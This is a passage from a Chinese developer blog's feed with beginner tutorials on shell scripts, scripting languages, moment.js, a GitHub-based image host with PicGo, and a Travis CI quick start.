class="line">who</span><br></pre></td></tr></table></figure><p>大功告成！这样就完成了一个简单的 shell 脚本的创建，是不是很简单！不过有以下几点需要注意：</p><ol><li>shell 脚本的名称不是一定需要用 .sh 来结尾，只是用 .sh 结尾会让其他人一目了然知道这是一个 shell 脚本文件。</li><li>在创建shell 脚本时，必须在第一行指定要使用的 shell，且格式固定为：<code>#!</code>开头。</li><li>第二行的井号作为注释行。</li></ol><p>运行shell 脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">showdate</span><br><span class="line">$ .&#x2F;showdate</span><br><span class="line">bash: permission denied: .&#x2F;showdate</span><br><span class="line">$ sudo .&#x2F;showdate</span><br><span class="line">sudo: .&#x2F;showdate: command not found</span><br><span class="line">$ chmod u+x showdate</span><br><span class="line">$ .&#x2F;showdate</span><br></pre></td></tr></table></figure><p>创建完 shell 脚本，想要运行，有两种方案：</p><ol><li>将 shell 脚本所处的目录添加到 PATH 环境变量中;</li><li>在提示符中用绝对路径或者是相对路径来引用 shell 脚本文件;</li></ol><p>在上面的例子中，用的是绝对路径的方式来执行shell 脚本，使用单点操作符表示当前目录下的文件。</p><p>需要注意的是，因为文件夹权限的关系，而不能直接用 sudo 命令去执行，因为sudo 命令会检查showdate 并不在sudo 命令列表中。</p><p>所以正解是：修改该文件的文件夹权限。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来记录编写 Shell 脚本过程中的一些基础知识。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>对于Shell编程的理解</title>
    <link href="https://www.0x2beace.com/understanding-of-shell-programming/"/>
    <id>https://www.0x2beace.com/understanding-of-shell-programming/</id>
    <published>2020-07-08T13:45:40.000Z</published>
    <updated>2020-07-08T13:55:36.897Z</updated>
    
    <content type="html"><![CDATA[<p>在开始聊Shell编程之前，我们先来看看计算机编程语言的都有哪些类型。</p><p>计算机语言可以分为两大类：</p><ol><li>低级语言</li><li>高级语言</li></ol><a id="more"></a><p>低级语言包括：<strong>机器语言</strong>和<strong>汇编语言</strong>。</p><p>高级语言包括：<strong>静态语言</strong>和<strong>动态语言</strong>。</p><p>这里就不对机器语言和汇编语言做介绍了，今天的主角是高级语言下的动态语言。</p><h3 id="动态语言"><a href="#动态语言" class="headerlink" title="动态语言"></a>动态语言</h3><p><strong>动态语言又叫做脚本语言。</strong></p><p>它和传统的静态语言的区别就在于:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前者的运行过程为：编写-&gt;解释-&gt;执行</span><br><span class="line">而后者的运行过程为：编写-&gt;编译-&gt;链接-&gt;执行</span><br></pre></td></tr></table></figure><p>脚本语言的优势就在于 只要有一个可以写代码的编辑器和能解释执行的脚本解释器就行了。</p><p>这样一想，也就明白了为什么搭建<code>Python</code>的开发环境远比<code>C#</code>要快，因为它只要安装一个解释器就好了。</p><blockquote><p>动态语言与静态语言存在的争议之一：</p></blockquote><p>在静态语言中，写代码时必须知道每个变量的类型; 而在动态语言中，随便什么时候，你都可以把变量设为任意类型的值。</p><h3 id="Shell编程"><a href="#Shell编程" class="headerlink" title="Shell编程"></a>Shell编程</h3><p>最初在学习<code>Shell</code>脚本时，产生过这样一个问题：<br><strong>为什么还能用<code>PHP</code>写<code>Shell</code>脚本？</strong></p><p>当时就很不理解。这里就反应了两个问题：</p><ol><li>对<code>PHP</code>的理解不深</li><li>对<code>Shell</code>脚本的理解不深</li></ol><p><strong>理论上讲，只要一门语言提供了解释器，这门语言就可以胜任脚本编程。</strong></p><p>所以用 <code>PHP</code> 可以写 <code>Shell</code> 脚本，就没有什么好奇怪的了。<br>你可能会问：这句话里面的 <code>Shell</code>怎么理解？</p><p>还记得吗，<code>Shell</code>的概念是什么？</p><blockquote><p><code>Shell</code> 脚本就是将一堆的 <code>Shell</code> 命令以及指定执行 <code>Shell</code> ，通过放在一个文件中来执行。</p></blockquote><h3 id="脚本语言的分类"><a href="#脚本语言的分类" class="headerlink" title="脚本语言的分类"></a>脚本语言的分类</h3><p>脚本语言又可以分为以下两大类：</p><ol><li><code>Shell</code>脚本</li><li>通用动态语言</li></ol><h5 id="常见的Shell脚本："><a href="#常见的Shell脚本：" class="headerlink" title="常见的Shell脚本："></a>常见的Shell脚本：</h5><ul><li>sh</li><li>bash</li><li>csh</li><li>ksh</li><li>tcsh</li><li>zsh</li><li>AppleScript </li></ul><h5 id="常见的脚本语言"><a href="#常见的脚本语言" class="headerlink" title="常见的脚本语言"></a>常见的脚本语言</h5><ul><li>JavaScript</li><li>Perl</li><li>PHP</li><li>Python</li><li>Ruby</li><li>VBScript</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在开始聊Shell编程之前，我们先来看看计算机编程语言的都有哪些类型。&lt;/p&gt;
&lt;p&gt;计算机语言可以分为两大类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;低级语言&lt;/li&gt;
&lt;li&gt;高级语言&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>关于Linux的Shell、Shell脚本、Shell环境的理解</title>
    <link href="https://www.0x2beace.com/understanding-of-linux-shell-shell-script-shell-environment/"/>
    <id>https://www.0x2beace.com/understanding-of-linux-shell-shell-script-shell-environment/</id>
    <published>2020-07-08T13:40:01.000Z</published>
    <updated>2020-07-08T13:52:22.046Z</updated>
    
    <content type="html"><![CDATA[<p>如标题所示，这片笔记主要目的是加深对<code>Linux</code>的<code>Shell</code>、<code>Shell脚本</code>、<code>Shell环境</code>的理解。</p><a id="more"></a><h2 id="什么是Shell？"><a href="#什么是Shell？" class="headerlink" title="什么是Shell？"></a>什么是Shell？</h2><ul><li><p>在回答这个问题之前，我们先来考虑一个问题：人是如何跟计算机打交道的？或者说怎样让计算机按照我们的要求完成某个任务？</p><ul><li>现在和计算机交互的方式很简单，直接用图形界面的工具就好了，想要计算机完成某个任务，通过操作图形界面的工具就能到达目的。</li><li>那么在以前呢？在那个计算机还没有这么先进的时代呢？人们又是如何让计算完成某个任务。通过“命令”的方式告诉计算机我需要你帮你完成这件事。这个“命令”又是怎么告诉计算机的呢？通过一个交互工具。这个工具可以实现与计算机之间的“你问我答，你说我做”的功能。</li></ul></li><li><p><code>Shell</code>就是一种应用程序（注意：我这里用的是一种）。</p></li><li><p>这个应用程序提供了一个界面（方便我们与计算机进行交互），用户通过这个界面访问操作系统内核的服务。</p></li></ul><h2 id="什么是Shell脚本？"><a href="#什么是Shell脚本？" class="headerlink" title="什么是Shell脚本？"></a>什么是Shell脚本？</h2><p><code>Shell</code> 脚本（<code>Shell Script</code>），是一种为 <code>Shell</code> 编写的脚本程序。</p><blockquote><p>Shell 脚本编程有两种方式</p></blockquote><ol><li>交互式（Interactive）：用户每输入一条命令就立即执行。</li><li>批处理（Batch）：由用户事先编写好一个完整的<code>Shell</code>脚本，<code>Shell</code>会一次性执行脚本中诸多的命令。</li></ol><h2 id="什么是Shell环境"><a href="#什么是Shell环境" class="headerlink" title="什么是Shell环境"></a>什么是Shell环境</h2><p><code>Shell</code>编程跟<code>java</code>、<code>php</code>编程一样，只要有一个<strong>能编写代码的文本编辑器</strong>和一个<strong>能解释执行的脚本解释器</strong>就可以了。</p><h3 id="0x01-Linux"><a href="#0x01-Linux" class="headerlink" title="0x01 Linux"></a>0x01 Linux</h3><ul><li><code>Linux</code> 默认安装了 <code>Shell</code> 解释器。</li><li>在<code>Linux</code>中，主流的 <code>Shell</code> 是 <code>Bash</code>。</li></ul><p>在一般情况下，人们并不区分 <code>Bourne Shell</code> 和 <code>Bourne Again Shell</code>，所以，像 <code>#!/bin/sh</code>，它同样也可以改为 <code>#!/bin/bash</code>。</p><h3 id="0x02-Mac-OS"><a href="#0x02-Mac-OS" class="headerlink" title="0x02 Mac OS"></a>0x02 Mac OS</h3><ul><li>Mac OS不仅带了sh、bash这两个最基础的解释器，还内置了ksh、csh、zsh等不常用的解释器。</li></ul><h3 id="0x03-Windows"><a href="#0x03-Windows" class="headerlink" title="0x03 Windows"></a>0x03 Windows</h3><p>Windows 出厂时没有内置 <code>Shell</code> 解释器，通常我们都是安装<code>cygwin</code>或者<code>mingw</code> 模拟器来Linux环境。</p><ul><li><a href="http://www.cygwin.com/" target="_blank" rel="noopener">Cygwin</a></li><li><a href="http://www.mingw.org/" target="_blank" rel="noopener">Mingw</a></li></ul><p>如Git的交互界面就是由<code>Mingw</code>模拟器提供的<code>Bash</code>。</p><h4 id="脚本解释器"><a href="#脚本解释器" class="headerlink" title="脚本解释器"></a>脚本解释器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash &#x3D;&gt; Bourne Again Shell（&#x2F;bin&#x2F;bash）</span><br><span class="line">sh &#x3D;&gt;  Bourne Shell（&#x2F;usr&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;sh）</span><br><span class="line">csh &#x3D;&gt; C Shell（&#x2F;usr&#x2F;bin&#x2F;csh）</span><br><span class="line">ksh &#x3D;&gt; K Shell（&#x2F;usr&#x2F;bin&#x2F;ksh）</span><br><span class="line">Shell for Root（&#x2F;sbin&#x2F;sh）</span><br></pre></td></tr></table></figure><h4 id="第一个Shell脚本"><a href="#第一个Shell脚本" class="headerlink" title="第一个Shell脚本"></a>第一个Shell脚本</h4><p>打开Bash或者任何一个文本编辑器，新建一个文件 Hello.sh，扩展名为<code>sh</code>(sh代表shell)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#第一个Shell脚本</span><br><span class="line">#作用是列出当前目录下的所有文件的详情信息</span><br><span class="line">PWDS&#x3D;echo &#96;pwd&#96;</span><br><span class="line">cd $PWDS</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure><p>上面这个脚本中，有三种不同的元素：</p><ol><li>第一行的脚本声明（<code>#!</code>）用来告诉系统使用<strong>哪种 Shell 解释器</strong>来执行该脚本；</li><li>第二行的注释信息（<code>#</code>）是对脚本功能和某些命令的介绍信息，使得看到脚本时能快速反应是做什么的。</li><li>剩下没有前缀标识的就是 所要执行的脚本具体命令了。</li></ol><h4 id="运行Shell脚本"><a href="#运行Shell脚本" class="headerlink" title="运行Shell脚本"></a>运行Shell脚本</h4><p>有两种方式：</p><h5 id="1-作为可执行程序"><a href="#1-作为可执行程序" class="headerlink" title="1. 作为可执行程序"></a>1. 作为可执行程序</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x example.sh    # 使脚本具有执行权限</span><br><span class="line">$ .&#x2F;example.sh           # 执行脚本</span><br></pre></td></tr></table></figure><h5 id="2-作为解释器参数"><a href="#2-作为解释器参数" class="headerlink" title="2. 作为解释器参数"></a>2. 作为解释器参数</h5><p>这种运行方式是，直接运行解释器，其参数就是shell脚本的文件名:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 执行脚本</span><br><span class="line">$ &#x2F;bin&#x2F;sh example.sh</span><br><span class="line">$ bash example.sh</span><br><span class="line">$ bash example.php</span><br></pre></td></tr></table></figure><p>使用这种方式时，可以不用在脚本第一行声明解释器信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat example.php</span><br><span class="line">#这是一个用php写的Shell脚本，有两个作用</span><br><span class="line">#1.确认是否用解释器参数执行shell脚本可以不用写声明</span><br><span class="line">#2.确认如何用php写shell脚本</span><br><span class="line">string&#x3D;&quot;php shell&quot;</span><br><span class="line">echo $string</span><br><span class="line">$ bash example.php</span><br><span class="line">php shell</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;如标题所示，这片笔记主要目的是加深对&lt;code&gt;Linux&lt;/code&gt;的&lt;code&gt;Shell&lt;/code&gt;、&lt;code&gt;Shell脚本&lt;/code&gt;、&lt;code&gt;Shell环境&lt;/code&gt;的理解。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>moment.js 用法总结</title>
    <link href="https://www.0x2beace.com/moment-js-usage-summary/"/>
    <id>https://www.0x2beace.com/moment-js-usage-summary/</id>
    <published>2020-07-07T10:59:32.000Z</published>
    <updated>2020-07-08T16:31:53.649Z</updated>
    
    <content type="html"><![CDATA[<p>最近在做的一个前端项目，经常会遇到对时间的处理，因为原生的时间格式处理起来很费劲，所以引入了一个轻量级的日期处理类库。</p><p><a href="http://momentjs.cn/" target="_blank" rel="noopener">momentjs</a> 支持日期格式化、Date、时间戳等相互转换，它使得操作时间变得非常简单。</p><a id="more"></a><h3 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h3><p><code>momentjs</code>支持多个环境，所有的代码都应该在这两种环境中都可以工作。</p><h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install moment</span><br><span class="line">var moment &#x3D; require(&#39;moment&#39;);</span><br></pre></td></tr></table></figure><h4 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;moment.js&#x2F;2.9.0&#x2F;moment.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>获取当前的日期和时间：</p><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moment();</span><br></pre></td></tr></table></figure><p>相当于moment(new Date()) 此处会返回一个moment封装的<strong>日期对象</strong>。</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200707190535.png" alt=""></p><h4 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">moment().format(&#39;YYYY年MM月DD日 HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020年07月07日 07:49:38&quot;</span><br><span class="line">moment().format(&#39;YYYY-MM-DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020-07-07 07:50:57&quot;</span><br><span class="line">moment().format(&#39;YYYY&#x2F;MM&#x2F;DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020&#x2F;07&#x2F;07 07:51:17&quot;</span><br><span class="line">moment().format(&#39;hh:m:ss&#39;) &#x2F;&#x2F; &quot;07:51:34&quot;</span><br><span class="line">moment().format(&#39;YYYY&#39;) &#x2F;&#x2F; &quot;2020&quot;</span><br><span class="line">moment().format(&#39;d&#39;) &#x2F;&#x2F; 2，今天是周二</span><br><span class="line">moment().format(&#39;X&#39;) &#x2F;&#x2F; 获取当前时间的Unix时间戳</span><br></pre></td></tr></table></figure><h4 id="转换为Date对象"><a href="#转换为Date对象" class="headerlink" title="转换为Date对象"></a>转换为Date对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">moment().toDate() &#x2F;&#x2F; Mon Jan 22 2018 18:11:55 GMT+0800 (中国标准时间)</span><br><span class="line">moment(&#39;2018-01-20&#39;).toDate() &#x2F;&#x2F; Tue Jan 20 2015 00:00:00 GMT+0800 (中国标准时间)</span><br><span class="line">moment(&#39;2018-01-22 10:20:15&#39;).toDate() &#x2F;&#x2F; Mon Jan 22 2018 10:20:15 GMT+0800 (中国标准时间)</span><br><span class="line">moment(1448896064621).toDate() &#x2F;&#x2F;毫秒转日期</span><br></pre></td></tr></table></figure><h4 id="获取时间信息"><a href="#获取时间信息" class="headerlink" title="获取时间信息"></a>获取时间信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">moment().second() &#x2F;&#x2F; 获取当前这一分钟的多少秒</span><br><span class="line">moment().date() &#x2F;&#x2F; 获取天</span><br><span class="line">moment().day()  &#x2F;&#x2F; 获取星期</span><br><span class="line">moment().dayOfYear()  &#x2F;&#x2F; 一年内的多少天</span><br><span class="line">moment().week() &#x2F;&#x2F; 一年里的多少周</span><br><span class="line">moment().month()  &#x2F;&#x2F; 获取当前月份（实际月份-1）</span><br><span class="line">moment().quarter() &#x2F;&#x2F; 一年内的第几个季度</span><br><span class="line">moment().year() &#x2F;&#x2F; 获取年份</span><br><span class="line">moment().daysInMonth() &#x2F;&#x2F; 获取当月天数</span><br></pre></td></tr></table></figure><h4 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h4><p>一旦解析和操作完成后，需要某些方式来显示 moment。</p><p>使用<code>format</code>来格式化日期：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">moment().format() &#x2F;&#x2F; &quot;2020-07-07T08:24:35+08:00&quot;</span><br><span class="line">moment.unix(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;);   &#x2F;&#x2F; 将Unix 时间戳转换为日期格式</span><br><span class="line">moment(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;);   &#x2F;&#x2F; 将Unix 毫秒时间戳转换为日期格式</span><br><span class="line">moment().unix();        &#x2F;&#x2F; 获取Unix 时间戳</span><br><span class="line">moment().format(&quot;X&quot;);   &#x2F;&#x2F; 获取Unix 时间戳</span><br><span class="line">moment().format(&quot;x&quot;);   &#x2F;&#x2F; 获取Unix 毫秒时间戳</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在做的一个前端项目，经常会遇到对时间的处理，因为原生的时间格式处理起来很费劲，所以引入了一个轻量级的日期处理类库。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://momentjs.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;momentjs&lt;/a&gt; 支持日期格式化、Date、时间戳等相互转换，它使得操作时间变得非常简单。&lt;/p&gt;</summary>
    
    
    
    <category term="前端" scheme="https://www.0x2beace.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="JavaScript" scheme="https://www.0x2beace.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>如何选择一个适合自己的图床</title>
    <link href="https://www.0x2beace.com/how-to-choose-a-picture-bed-that-suits-you/"/>
    <id>https://www.0x2beace.com/how-to-choose-a-picture-bed-that-suits-you/</id>
    <published>2020-07-06T15:06:33.000Z</published>
    <updated>2020-07-10T05:36:37.965Z</updated>
    
    <content type="html"><![CDATA[<p>因为没有把博客部署在服务器上，而是选择GitHub Pages 的方式，所以如果遇到需要插入图片的时候，只能通过图床来存储图片。</p><p>如果不是因为<a href="https://sm.ms/" target="_blank" rel="noopener">SM.MS</a> 图床在今天突然挂掉了，我可能都不会去想是否需要更换图床这个问题。</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706225801.png" alt=""></p><p>于是我开始寻找一个免费、稳定的图床，最后在众多图床中，最后选择了GitHub 图床。</p><p>使用GitHub 图床，可能唯一的问题是需要自备好科学上网工具，否则图片无法加载。</p><a id="more"></a><blockquote><p>为什么不选择国内的那些图床服务？</p></blockquote><p>我只是想存一些图片，而国内的大部分图床服务，还需要做域名备案以及绑定各种服务，感觉很繁琐，加上我的域名不是在国内的域名服务商那里买的，索性就没有考虑国内的图床服务。</p><h3 id="图床管理工具"><a href="#图床管理工具" class="headerlink" title="图床管理工具"></a>图床管理工具</h3><p>有了图床，就需要顺手配置一个图床管理工具，这里我选择的是 <a href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener">PicGo</a>，仅目前支持的图床就有：SM.MS图床，微博图床，七牛图床，腾讯云COS，阿里云OSS，Imgur，又拍云，GitHub 图床等。</p><h3 id="创建GitHub-图床"><a href="#创建GitHub-图床" class="headerlink" title="创建GitHub 图床"></a>创建GitHub 图床</h3><p>首先，你得有一个<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a> 账号。</p><h4 id="1-新建一个仓库"><a href="#1-新建一个仓库" class="headerlink" title="1. 新建一个仓库"></a>1. 新建一个仓库</h4><p>这个仓库是用于存储图片，最好是public，因为private的仓库，图片链接会带token，而这个token会存在过期的问题。</p><h4 id="2-获取授权token"><a href="#2-获取授权token" class="headerlink" title="2. 获取授权token"></a>2. 获取授权token</h4><p>通过<code>Settings-&gt;Developer settings-&gt;Personal access tokens</code> <a href="https://github.com/settings/tokens/new" target="_blank" rel="noopener">创建一个新的token</a> 用于PicGo操作你的仓库。</p><p>把repo的勾打上即可，点击Generate token的绿色按钮生成 token。</p><p>创建成功后，会生成一串token，这串token之后不会再显示，所以第一次看到的时候最好保存好。</p><h3 id="配置PicGo"><a href="#配置PicGo" class="headerlink" title="配置PicGo"></a>配置PicGo</h3><p>GitHub 图床的配置还是比较简单的，下面是参数说明。</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706225324.png" alt=""></p><ul><li>仓库名：你的图床仓库的名称，格式为：<code>username/repository</code></li><li>分支名：一般选择默认分支 <code>master</code></li><li>Token：刚才生成的 Token</li><li>存储路径：指定存放在仓库的哪个目录下</li><li>自定义域名：<code>raw.githubusercontent.com/username/repository/branch</code></li></ul><p>自定义域名最好按照一定的规则去定义：<code>raw.githubusercontent.com</code>+你的github用户名+仓库名称+分支名称</p><blockquote><p><code>raw.githubusercontent.com</code> 是github用来存储用户上传文件的服务地址，是github 的素材服务器 (assets server)。</p></blockquote><p>通常配置完成之后，就可以直接使用了。</p><p>如果你上传失败的情况，可以打开PicGo 的日志看看具体是什么异常</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706220223.png" alt=""></p><p>如果得到了这样的异常，那么大概率是因为你没有开启全局代理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[PicGo ERROR] RequestError: Error: connect ECONNREFUSED 13.250.168.23:443&#96;</span><br></pre></td></tr></table></figure><p>因为GitHub 服务器和国内 GFW 的问题会导致有时上传成功，有时上传失败，所以需要自备好科学上网工具。</p><p>如果你还有其他问题，可以查阅 <a href="https://github.com/Molunerfinn/PicGo/blob/dev/FAQ.md" target="_blank" rel="noopener">PicGo FAQ</a>。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>如果你和我一样，讨厌域名备案，又希望能有一个免费、稳定的图床，那么一定不要错过GitHub 图床。</li><li>如果你只是需要存储一些不怎么重要的图片，那么可以使用免费不限大小的SM.MS图床。</li><li>如果打算长期稳定使用可以优先选择又拍云或者七牛云。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;因为没有把博客部署在服务器上，而是选择GitHub Pages 的方式，所以如果遇到需要插入图片的时候，只能通过图床来存储图片。&lt;/p&gt;
&lt;p&gt;如果不是因为&lt;a href=&quot;https://sm.ms/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SM.MS&lt;/a&gt; 图床在今天突然挂掉了，我可能都不会去想是否需要更换图床这个问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706225801.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;于是我开始寻找一个免费、稳定的图床，最后在众多图床中，最后选择了GitHub 图床。&lt;/p&gt;
&lt;p&gt;使用GitHub 图床，可能唯一的问题是需要自备好科学上网工具，否则图片无法加载。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    <category term="Skill" scheme="https://www.0x2beace.com/categories/Tutorial/Skill/"/>
    
    <category term="GitHub" scheme="https://www.0x2beace.com/categories/Tutorial/Skill/GitHub/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
  </entry>
  
  <entry>
    <title>Travis CI 快速上手</title>
    <link href="https://www.0x2beace.com/travis-ci-quick-start/"/>
    <id>https://www.0x2beace.com/travis-ci-quick-start/</id>
    <published>2020-07-05T06:25:58.000Z</published>
    <updated>2020-07-09T13:12:54.040Z</updated>
    
    <content type="html"><![CDATA[<p>最近使用Github Pages 搭建Hexo 时，用到了一项新技术。hmm…也不能说是新技术吧，只是之前一直有听说，但却没有实际用过。</p><p>它就是持续集成，听上去好像是一个高大上的概念，但通俗一点解释就是：写完代码提交之后，会根据你的要求，自动做编译测试。</p><p>其中最出名大概就是<a href="https://travis-ci.com/" target="_blank" rel="noopener">Travis CI</a>了，本文的目的就是快速入门 Travis CI。</p><a id="more"></a><h2 id="什么是持续集成？"><a href="#什么是持续集成？" class="headerlink" title="什么是持续集成？"></a>什么是持续集成？</h2><p>持续集成(Continuous Integration)是对小周期的的代码进行更改，其目的是通过以较小的增量开发和测试来构建更健康的软件。</p><p>而Travis CI 作为一个持续集成平台，通过自动构建和测试代码，并提供更改成功的即时反馈。</p><h3 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h3><p>在正式开始之前，需要提前准备好以下先决条件：</p><ul><li>一个 <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a> 帐户</li><li>托管在 <a href="https://github.com/" target="_blank" rel="noopener">Github</a> 的项目的所有者权限</li></ul><p>需要注意的是：Travis CI不是完全免费的服务，前100个私有构建是免费的，后续就要进行付费，如果你的项目是开源的，或者你是学生，则不受限制。</p><h4 id="在Github-上使用Travis-CI"><a href="#在Github-上使用Travis-CI" class="headerlink" title="在Github 上使用Travis CI"></a>在Github 上使用Travis CI</h4><ol><li>将 <a href="https://github.com/marketplace/travis-ci" target="_blank" rel="noopener">Travis CI</a> 添加到你的 GitHub 账户中。</li><li>前往 GitHub 的 <a href="https://github.com/settings/installations" target="_blank" rel="noopener">Applications settings</a>，配置 Travis CI 权限，使其能够访问你的 repository。</li><li>前往 GitHub 新建 <a href="https://github.com/settings/tokens" target="_blank" rel="noopener">Personal Access Token</a>，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。</li><li>回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。</li><li>在你的项目中新建一个 <code>.travis.yml</code> 文件。</li><li>提交并推送以触发Travis CI构建。</li></ol><p>其中<code>.travis.yml</code>文件的目的是告诉 Travis CI 应该做些什么。</p><p>以下示例指定了应使用Ruby 2.2和最新版本的JRuby构建的Ruby项目。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">language: ruby</span><br><span class="line">rvm:</span><br><span class="line"> - 2.2</span><br><span class="line"> - 